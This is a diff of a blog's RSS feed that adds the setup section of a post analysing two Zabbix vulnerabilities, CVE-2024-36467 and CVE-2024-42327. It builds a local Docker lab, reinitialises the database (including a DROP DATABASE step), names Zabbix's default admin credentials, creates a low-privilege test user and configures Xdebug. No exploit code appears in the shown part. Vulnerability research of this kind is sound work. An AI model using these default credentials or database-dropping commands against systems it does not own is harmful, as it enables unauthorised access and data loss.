@@ -6,8 +6,916 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 01 Nov 2025 10:29:44 +0800</lastBuildDate>
+        <lastBuildDate>Fri, 05 Dec 2025 10:29:44 +0800</lastBuildDate>
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Zabbix CVE-2024-36467 &amp; CVE-2024-42327 Analysis</title>
+            <link>https://mathscantor.github.io/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/</link>
+            <pubDate>Fri, 05 Dec 2025 10:29:44 +0800</pubDate>
+            
+            <guid>https://mathscantor.github.io/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/</guid>
+            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s been a while my friends. You will have to blame the global release of &lt;a href=&#34;https://www.wherewindsmeetgame.com/&#34;&gt;Where Winds Meet&lt;/a&gt; for my unsightly procrastination. Anyways, back onto the main topic for today&amp;rsquo;s post! We shall be doing a deep-dive analysis on two particular CVEs related to Zabbix that was publicly disclosed over a year ago, CVE-2024-36467 and CVE-2024-42327.&lt;/p&gt;
+&lt;p&gt;Zabbix is an open-source, enterprise-class monitoring solution for tracking the performance and availability of IT infrastructure, including servers, networks, applications, and cloud services.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
+<p>It&rsquo;s been a while my friends. You will have to blame the global release of <a href="https://www.wherewindsmeetgame.com/">Where Winds Meet</a> for my unsightly procrastination. Anyways, back onto the main topic for today&rsquo;s post! We shall be doing a deep-dive analysis on two particular CVEs related to Zabbix that was publicly disclosed over a year ago, CVE-2024-36467 and CVE-2024-42327.</p>
+<p>Zabbix is an open-source, enterprise-class monitoring solution for tracking the performance and availability of IT infrastructure, including servers, networks, applications, and cloud services.</p>
+<p>The main setup involves using Docker to spin up our test environment. In addition, I will also walk through the additional dependencies needed to debug Zabbix&rsquo;s PHP web source code so that we can understand the vulnerability better.</p>
+<h2 id="2-setup">2. Setup</h2>
+<h3 id="21-docker-containers">2.1 Docker Containers</h3>
+<p>Zabbix has been kind enough to provide <a href="https://www.zabbix.com/container_images">official Docker images</a> to pull from, making the setup less painful. (It still hurts though!)</p>
+<link href="/posts/css/alert.css" rel="stylesheet">
+<div class="alert warning">
+    <div class="alert-content">
+        <div class="alert-header">
+            <span class="alert-icon"></span>
+            <strong class="alert-title">Warning</strong>
+        </div>
+        <div class="alert-body"><ul>
+<li>Zabbix v7.0.0 only supports MySQL database up to v8.03.x</li>
+</ul>
+</div>
+    </div>
+</div>
+
+<p>Here&rsquo;s the Docker compose file for your convenience:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3.8&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">mysql-server</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">mysql:8.0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">mysql-server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_ROOT_PASSWORD</span>: <span style="color:#ae81ff">my_secret_password</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_DATABASE</span>: <span style="color:#ae81ff">zabbix</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_USER</span>: <span style="color:#ae81ff">zabbix</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_PASSWORD</span>: <span style="color:#ae81ff">zabbix_password</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./mysql_data:/var/lib/mysql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">healthcheck</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">test</span>: [<span style="color:#e6db74">&#34;CMD&#34;</span>, <span style="color:#e6db74">&#34;mysqladmin&#34;</span>, <span style="color:#e6db74">&#34;ping&#34;</span>, <span style="color:#e6db74">&#34;-h&#34;</span>, <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#e6db74">&#34;-pmy_secret_password&#34;</span>]
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">interval</span>: <span style="color:#ae81ff">10s</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">timeout</span>: <span style="color:#ae81ff">5s</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">retries</span>: <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">start_period</span>: <span style="color:#ae81ff">30s</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">zabbix-server</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">zabbix/zabbix-server-mysql:ubuntu-7.0.0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">zabbix-server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">DB_SERVER_HOST</span>: <span style="color:#ae81ff">mysql-server</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_DATABASE</span>: <span style="color:#ae81ff">zabbix</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_USER</span>: <span style="color:#ae81ff">zabbix</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_PASSWORD</span>: <span style="color:#ae81ff">zabbix_password</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">mysql-server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;10051:10051&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">zabbix-frontend</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">zabbix/zabbix-web-apache-mysql:ubuntu-7.0.0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">zabbix-frontend</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">DB_SERVER_HOST</span>: <span style="color:#ae81ff">mysql-server</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_DATABASE</span>: <span style="color:#ae81ff">zabbix</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_USER</span>: <span style="color:#ae81ff">zabbix</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_PASSWORD</span>: <span style="color:#ae81ff">zabbix_password</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">ZBX_SERVER_HOST</span>: <span style="color:#ae81ff">zabbix-server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">zabbix-server</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">mysql-server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;80:8080&#34;</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Docker<span style="font-family: Courier; font-weight: 600"> compose.yml </span><br><br></span>
+<p>From experience, the <code>zabbix</code> database will not be populated after spinning up the containers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker compose up -d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker logs zabbix-server
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>7:20251101:034605.778 cannot use database <span style="color:#e6db74">&#34;zabbix&#34;</span>: its <span style="color:#e6db74">&#34;users&#34;</span> table is empty <span style="color:#f92672">(</span>is this the Zabbix proxy database?<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Empty Zabbix Database<br><br></span>
+<h3 id="22-database-initialization">2.2 Database Initialization</h3>
+<p>To solve this issue, there are several steps we need to undertake to initialize and populate the database.</p>
+<p>Firstly, get the 7.0.0rc3 release files from Zabbix&rsquo;s Github repository.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ wget https://github.com/zabbix/zabbix/archive/refs/tags/7.0.0rc3.zip
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Getting 7.0.0rc3 Source Files<br><br></span>
+<p>Next, proceed to unzip it and run the Perl scripts to generate<span style="font-family: Courier; font-weight: 600"> data.sql </span>and<span style="font-family: Courier; font-weight: 600"> schema.sql</span>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ unzip 7.0.0rc3.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ chmod +x zabbix-7.0.0rc3/create/bin/gen_schema.pl <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>chmod +x zabbix-7.0.0rc3/create/bin/gen_data.pl <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>./zabbix-7.0.0rc3/create/bin/gen_data.pl mysql &gt; zabbix-7.0.0rc3/database/mysql/data.sql <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>./zabbix-7.0.0rc3/create/bin/gen_schema.pl mysql &gt; zabbix-7.0.0rc3/database/mysql/schema.sql
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Generating SQL Statements For Initialization<br><br></span>
+<p>Then, proceed to drop the placeholder zabbix database inside the <em>mysql-server</em> container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker exec -i mysql-server mysql -u root -pmy_secret_password -e <span style="color:#e6db74">&#34;DROP DATABASE zabbix;&#34;</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Dropping Zabbix Database<br><br></span>
+<p>Following the Zabbix v7.0 official <a href="https://www.zabbix.com/documentation/7.0/en/manual/appendix/install/db_scripts">documentation on database creation</a>, run the following commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">create</span> <span style="color:#66d9ef">database</span> zabbix character <span style="color:#66d9ef">set</span> utf8mb4 <span style="color:#66d9ef">collate</span> utf8mb4_bin;
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">create</span> <span style="color:#66d9ef">user</span> <span style="color:#e6db74">&#39;zabbix&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;localhost&#39;</span> identified <span style="color:#66d9ef">by</span> <span style="color:#e6db74">&#39;zabbix_password&#39;</span>;
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">grant</span> <span style="color:#66d9ef">all</span> <span style="color:#66d9ef">privileges</span> <span style="color:#66d9ef">on</span> zabbix.<span style="color:#f92672">*</span> <span style="color:#66d9ef">to</span> <span style="color:#e6db74">&#39;zabbix&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;localhost&#39;</span>;
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">GLOBAL</span> log_bin_trust_function_creators <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> quit;
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Creating Zabbix Database, Zabbix User and Setting Permissions<br><br></span>
+<p>Once the <em>zabbix</em> user for the database is created, proceed to populate the <em>zabbix</em> database with schema.sql and data.sql generated previously via Perl scripts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Create the tables</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker exec -i mysql-server mysql -u zabbix -pzabbix_password zabbix &lt; ./zabbix-7.0.0rc3/database/mysql/schema.sql 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import images</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker exec -i mysql-server mysql -u zabbix -pzabbix_password zabbix &lt; ./zabbix-7.0.0rc3/database/mysql/images.sql
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import data</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker exec -i mysql-server mysql -u zabbix -pzabbix_password --default-character-set<span style="color:#f92672">=</span>utf8mb4 zabbix &lt; ./zabbix-7.0.0rc3/database/mysql/data.sql
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Running SQL statements<br><br></span>
+<p>Now that we have finally populated the database, we should revert <code>log_bin_trust_function_creators</code> back to 0.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker exec -i mysql-server mysql -u root -pmy_secret_password -e <span style="color:#e6db74">&#34;SET GLOBAL log_bin_trust_function_creators = 0;&#34;</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Reverting back <span style="font-family: Courier; font-weight: 600"> log_bin_trust_function_creators </span><br><br></span>
+<p>Finally, restart the containers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker compose restart
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Restarting Containers<br><br></span>
+<p>If all is well, then the basic setup is finally done. Verify that the current basic setup is working properly by logging in through the Web GUI (<span style="font-family: Courier; font-weight: 600">http://127.0.0.1</span>) with the default admin credentials (<code>Admin::zabbix</code>).</p>
+<p><img class="center" alt="zabbix-login" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/zabbix-login.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Zabbix Login Page<br><br></span></p>
+<p><img class="center" alt="zabbix-admin-dashboard" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/zabbix-admin-dashboard.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Zabbix Admin Dashboard<br><br></span></p>
+<h3 id="23-user-group-vs-role">2.3 User Group vs Role</h3>
+<p>Before we create our user, it is crucial to understand the difference between a Zabbix user group and role.</p>
+<p>A user group is a way to organize users and define what parts of the Zabbix environment they are allowed to access. For example, user groups control which hosts or host groups a user can see.</p>
+<p>In the case of the user role, it defines the permissions and capabilities of the user. For instance, roles control whether a user can edit hosts and whether they have access to APIs.</p>
+<p>Tables 1 and 2 summarizes the different user groups and roles that can be assigned to a Zabbix user.</p>
+<p><a name="table1"></a></p>
+<table>
+  <thead>
+      <tr>
+          <th>usrgrpid</th>
+          <th>Name</th>
+          <th>Description</th>
+          <th>Privilege ranking (1 being highest)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>7</td>
+          <td>Zabbix administrators</td>
+          <td>Full-access group containing Super Admins and Admins; unrestricted visibility and control</td>
+          <td>1</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>Guests</td>
+          <td>Read-only access to limited hosts; lowest visibility and permissions</td>
+          <td>5</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>Disabled</td>
+          <td>Users who cannot log in or perform any actions</td>
+          <td>6</td>
+      </tr>
+      <tr>
+          <td>11</td>
+          <td>Enabled debug mode</td>
+          <td>Users allowed to see extended debug information for troubleshooting</td>
+          <td>3</td>
+      </tr>
+      <tr>
+          <td>12</td>
+          <td>No access to the frontend</td>
+          <td>Users blocked from using the UI but preserved for API or background integrations</td>
+          <td>4</td>
+      </tr>
+      <tr>
+          <td>13</td>
+          <td>Internal</td>
+          <td>System-reserved group used for internal operations; not intended for regular user accounts</td>
+          <td>2</td>
+      </tr>
+  </tbody>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table">Default User Groups<br><br></span>
+<table>
+  <thead>
+      <tr>
+          <th>roleid</th>
+          <th>Name</th>
+          <th>Description</th>
+          <th>Drivilege ranking (1 being highest)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>User</td>
+          <td>Standard Zabbix user with limited configuration rights; can view data within allowed scope and has rights to a restricted set of API calls (read-only and self-related actions).</td>
+          <td>3</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Admin</td>
+          <td>Can manage most configuration elements but cannot change system-wide settings; has broad API access including host, item, trigger, and template management but excluding system-level API methods.</td>
+          <td>2</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Super admin</td>
+          <td>Full system-wide administrative rights, including global configuration and user management; has unrestricted API access across all methods.</td>
+          <td>1</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Guest</td>
+          <td>Extremely limited, read-only access for anonymous or low-privileged viewing; no rights to API calls.</td>
+          <td>4</td>
+      </tr>
+  </tbody>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table">Default User Roles<br><br></span>
+<h3 id="24-user-creation">2.4 User Creation</h3>
+<p>From the side panel, go to<span style="font-family: Courier; font-weight: 600"> Users &gt; Users &gt; Create user</span>.</p>
+<p><img class="center" alt="zabbix-user-creation-1" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/zabbix-user-creation-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Creating New User<br><br></span></p>
+<p>In order for us to do API calls, the user minimally needs to have the <code>User</code> role. In addition, we will also place the user only in the <code>Guests</code> group (See Figure 4 and 5). For this example, my new user credentials are <code>user::P@ssw0rd123</code>.</p>
+<p><img class="center" alt="zabbix-user-creation-2" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/zabbix-user-creation-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Assigning Group<br><br></span></p>
+<p><img class="center" alt="zabbix-user-creation-3" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/zabbix-user-creation-3.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Assigning Role<br><br></span></p>
+<h3 id="24-php-debugging-with-xdebug3">2.4 PHP Debugging With Xdebug3</h3>
+<p>At this point, we have almost everything we need. However, if we want to perform better analysis dynamically, we ought to enable remote debugging via Xdebug3. For those of you who are not using Visual Studios Code as your IDE for PHP debugging, I&rsquo;m sorry 😛.</p>
+<p>Firstly, run the following command to get a root shell in the <em>zabbix-frontend</em> container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker exec --user root -it zabbix-frontend bash
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Getting Root Shell in <em>zabbix-frontend</em> Container<br><br></span>
+<p>Perform an update before installing the necessary dependencies for Xdebug3. Then, install Xdebug3 via <em>pecl</em>. (See listing below)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@8fd0af2bdb87:/usr/share/zabbix# apt update &amp;&amp; apt install -y php8.3-dev php-pear build-essential autoconf vim
+</span></span><span style="display:flex;"><span>root@8fd0af2bdb87:/usr/share/zabbix# pecl install xdebug
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing Xdebug3 via <em>Pecl</em><br><br></span>
+<p>Add the following lines in <b><em>/etc/php/8.3/apache2/php.ini</em></b>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">root@8fd0af2bdb87:/usr/share/zabbix# vim /etc/php/8.3/apache2/php.ini</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">zend_extension</span><span style="color:#f92672">=</span><span style="color:#e6db74">xdebug.so</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[Xdebug]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.mode</span><span style="color:#f92672">=</span><span style="color:#e6db74">debug</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.start_with_request</span><span style="color:#f92672">=</span><span style="color:#e6db74">yes</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.idekey</span><span style="color:#f92672">=</span><span style="color:#e6db74">docker</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; 172.17.0.1 is the default gateway for Docker&#39;s built-in bridge network</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.client_host</span><span style="color:#f92672">=</span><span style="color:#e6db74">172.17.0.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.client_port</span><span style="color:#f92672">=</span><span style="color:#e6db74">9003</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.log</span><span style="color:#f92672">=</span><span style="color:#e6db74">/tmp/xdebug.log</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xdebug.log_level</span><span style="color:#f92672">=</span><span style="color:#e6db74">0</span>
+</span></span></code></pre></div><p>Once done, restart the <em>zabbix-frontend</em> container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ docker compose restart zabbix-frontend
+</span></span></code></pre></div><p><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Restarting <em>zabbix-frontend</em> Container<br><br></span>
+<link href="/posts/css/alert.css" rel="stylesheet">
+<div class="alert caution">
+    <div class="alert-content">
+        <div class="alert-header">
+            <span class="alert-icon"></span>
+            <strong class="alert-title">Caution</strong>
+        </div>
+        <div class="alert-body"><ul>
+<li>Up until this point, the configuration changes in <b><em>/etc/php/8.3/apache2/php.ini</em></b> and our Xdebug3 libraries that we installed are ephemeral, and will be gone the moment you do <code>docker compose down</code></li>
+<li>Consider putting these commands in a <b><em>Dockerfile</em></b> for convenience</li>
+</ul>
+</div>
+    </div>
+</div>
+</p>
+<p>Copy out the web root source code from<span style="font-family: Courier; font-weight: 600"> /usr/share/zabbix </span>from the <em>zabbix-frontend</em> container and set the ownership to the current user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo cp -r <span style="color:#66d9ef">$(</span>docker inspect -f <span style="color:#e6db74">&#39;{{ .GraphDriver.Data.MergedDir }}&#39;</span> zabbix-frontend<span style="color:#66d9ef">)</span>/usr/share/zabbix src
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>gerald㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/Experiments/Zabbix<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo chown -R $USER:$USER src
+</span></span></code></pre></div><p>Next, install the <em>PHP Extension Pack</em> from the VS Code marketplace, which contains both the <em>PHP Intellisense</em> and <em>PHP Debug</em> extensions.</p>
+<p><img class="center" alt="vscode-extension" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-extension.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Installing <em>PHP Extension Pack</em><br><br></span></p>
+<p>Click on<span style="font-family: Courier; font-weight: 600"> Run and Debug &gt; create a launch.json file &gt; PHP </span>to generate<span style="font-family: Courier; font-weight: 600"> .vscode/launch.json</span>.</p>
